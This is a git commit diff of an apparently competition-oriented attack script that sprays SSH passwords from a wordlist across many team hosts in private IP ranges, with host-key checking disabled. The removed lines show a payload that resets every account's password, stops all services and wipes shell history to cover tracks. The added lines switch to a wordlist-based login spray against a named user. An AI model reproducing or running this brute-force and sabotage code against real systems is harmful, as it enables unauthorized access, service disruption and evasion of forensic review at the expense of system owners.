d6eafa90c42b10a0af95ddd37c50a31a8ac43c2b
Liam Brennan <lfb6ek@virginia.edu>
2021-03-07 12:12:33 -0500

    update

--- shell.py
+++ shell.py
@@ -8,7 +8,8 @@ async def ssh(user, host, cmd, password, timeout=30):
 		options = '-q -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oPubkeyAuthentication=no -f'                                                                         
 
 		ssh_cmd = f'ssh {user}@{host} {options} "{cmd}"'                                                                                                               
-		child = pexpect.spawn(ssh_cmd, timeout=timeout, encoding="utf-8")                                                                                                                            
+		child = pexpect.spawn(ssh_cmd, timeout=timeout, encoding="utf-8")   
+		child.log_file = open("list.log", "w")                                                                                                                         
 		child.expect(['password: '])                                                                                                                                                                                                                                                                                               
 		child.sendline(password)                                                                                                                                                                                                                                                                                                     
 		child.expect(pexpect.EOF)                                                                                                                                                  
@@ -20,26 +21,24 @@ async def ssh(user, host, cmd, password, timeout=30):
 
 # fuck around with any command we want
 command = """
-getent passwd | awk -F: '{print $1 ":" $1 "Chiapet1"}' | chpasswd /dev/stdin;
-for s in `systemctl | grep service | cut -d '.' -f 1`; do systemctl stop $s; done
 
-history -c;
-rm ~/.bash_history;
-exit;
 """
 
-default_passwords = str(sys.argv)[1:]
+default_passwords = []
+
+with open("wordlist.txt") as f:
+	default_passwords = f.readlines()
 
 
 # each team
-for team in range(16):
+for team in range(1, 17):
+	if team == 14: continue
 	# each teams servers
 	for server in [1, 2, 3, 4, 5, 6, 11, 12, 13, 20, 21, 22, 42, 69]:
 		# check each default password
 		for password in default_passwords:
-
-			asyncio.run(ssh(user="root", host=f"10.{team}.1.{server}", cmd=command, password=password))
-			asyncio.run(ssh(user="root", host=f"172.16.{team}.{server}", cmd=command, password=password))
+			asyncio.run(ssh(user="Yuugo.Takagawa", host=f"10.{team}.1.{server}", cmd=command, password=password))
+			asyncio.run(ssh(user="Yuugo.Takagawa", host=f"172.16.{team}.{server}", cmd=command, password=password))
 
 
 
